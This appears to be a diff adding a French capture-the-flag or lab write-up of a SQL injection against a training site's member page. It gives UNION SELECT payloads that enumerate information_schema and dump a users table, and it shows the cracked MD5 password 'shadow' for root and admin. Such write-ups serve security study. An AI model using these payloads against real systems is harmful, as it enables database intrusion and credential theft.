@@ -1,0 +1,47 @@
+Sur la page : /index.php?page=member
+
+1 - On recupere les noms des tables de la bdd :
+
+	query:
+
+		1 OR 1 = 1 UNION SELECT table_schema, table_name FROM information_schema.TABLES
+
+	result : 
+		First name: Member_Brute_Force
+		Surname : db_default
+
+
+2 - on recupere la structure de la table :
+
+	query :
+
+		1 OR 1 = 1 UNION SELECT table_name, column_name FROM information_schema.COLUMNS
+
+	result :
+		Table name: db_default
+		column : id
+
+		Table name: db_default
+		column : username
+
+		Table name: db_default
+		column : password
+
+3 - on recupere les users de cette table :
+	
+	query : 
+		
+		0 OR 1 = 0 UNION SELECT username, password FROM Member_Brute_Force.db_default
+
+	result :
+		
+		username : root
+		password : 3bf1114a986ba87ed28fc1b5884fc2f8
+		
+		username: admin
+		password : 3bf1114a986ba87ed28fc1b5884fc2f8
+
+4 - root et admin ont le meme mot de passe crypter en md5, si on decrypt le mot de passe le resultat est : shadow
+
+	username : root|admin
+	password : shadow
